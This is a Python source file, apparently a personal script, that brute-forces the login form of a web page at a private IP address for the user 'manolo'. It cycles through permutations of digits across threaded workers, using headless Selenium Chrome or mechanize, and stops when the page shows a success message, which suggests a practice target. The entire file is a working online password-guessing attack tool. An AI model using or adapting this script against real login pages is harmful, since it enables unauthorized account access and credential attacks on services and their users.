import os
import itertools, queue, threading
import mechanize
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

URL = "http://192.168.1.35/"
CHARS = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
USER = "manolo"
PASS_LENG = 7
N = 10

def queueTrhead(pb, queue):
    while True:
        password = queue.get()
        pb.login(password)
        queue.task_done()

def queueTrhead_mechanized(pb, queue):
    while True:
        password = queue.get()
        pb.loginMechanize(password)
        queue.task_done()

class PassBroker:
    URL = ""
    USER = ""
    CHARS = ""
    N = 0
    PASS_LENG = 1
    queue = queue.Queue()

    def __init__(self, URL, USER, CHARS, N, PASS_LENG):
        self.URL = URL
        self.USER = USER
        self.CHARS = CHARS
        self.N = N
        self.PASS_LENG = PASS_LENG

    def login(self, tupleOfPasswords):
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        driver = webdriver.Chrome(executable_path="D:\Fragmentos de programas\Scrapping-BruteForce [Python]\chromedriver.exe",chrome_options=chrome_options)
        driver.get(self.URL)
        password = ''.join(tupleOfPasswords)
        driver.find_element(By.NAME, "user").send_keys(self.USER)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.NAME, "login").click()
        html = driver.find_element(By.TAG_NAME, "body").text
        if "Congratulations!!! :-)" in html:
            print("Password found: ",password)
            os._exit(1)
        driver.close()

    def loginMechanize(self, tupleOfPasswords):
        br = mechanize.Browser()
        br.open("http://192.168.1.35/")
        password = ''.join(tupleOfPasswords)
        br.select_form(nr=0)
        br["user"] = self.USER
        br["password"] = password
        response = br.submit()
        html = response.read().decode("utf-8")
        if "Congratulations!!! :-)" in html:
            br.close()
            print("Password found: ", password)
            os._exit(1)

    def basicBF(self):
        i = 0
        while i < len(self.CHARS):
            result = list(itertools.permutations(self.CHARS, i))
            for element in result:
                self.login(element)
            i += 1
        return result

    def parallelizedBF(self):
        for i in range(self.N):
            th = threading.Thread(target=queueTrhead, args=(self, self.queue))
            th.setDaemon(True)
            th.start()
        while self.PASS_LENG <= len(self.CHARS):
            permutations = list(itertools.permutations(self.CHARS, self.PASS_LENG))
            for permutation in permutations:
                self.queue.put(permutation)
            self.PASS_LENG += 1
        self.queue.join()

    def parallelizedBF_mechanized(self):
        for i in range(self.N):
            th = threading.Thread(target=queueTrhead_mechanized, args=(self, self.queue))
            th.setDaemon(True)
            th.start()
        while self.PASS_LENG <= len(self.CHARS):
            permutations = list(itertools.permutations(self.CHARS, self.PASS_LENG))
            for permutation in permutations:
                self.queue.put(permutation)
            self.PASS_LENG += 1
        self.queue.join()

"""
pb = PassBroker(URL, USER, CHARS)
pb.basicBF()
"""

"""
pb = PassBroker(URL, USER, CHARS, N)
pb.parallelizedBF()
"""

"""
pb = PassBroker(URL, USER, CHARS, N, PASS_LENG)
pb.parallelizedBF()
"""

pb = PassBroker(URL, USER, CHARS, N, 5)
pb.parallelizedBF_mechanized()
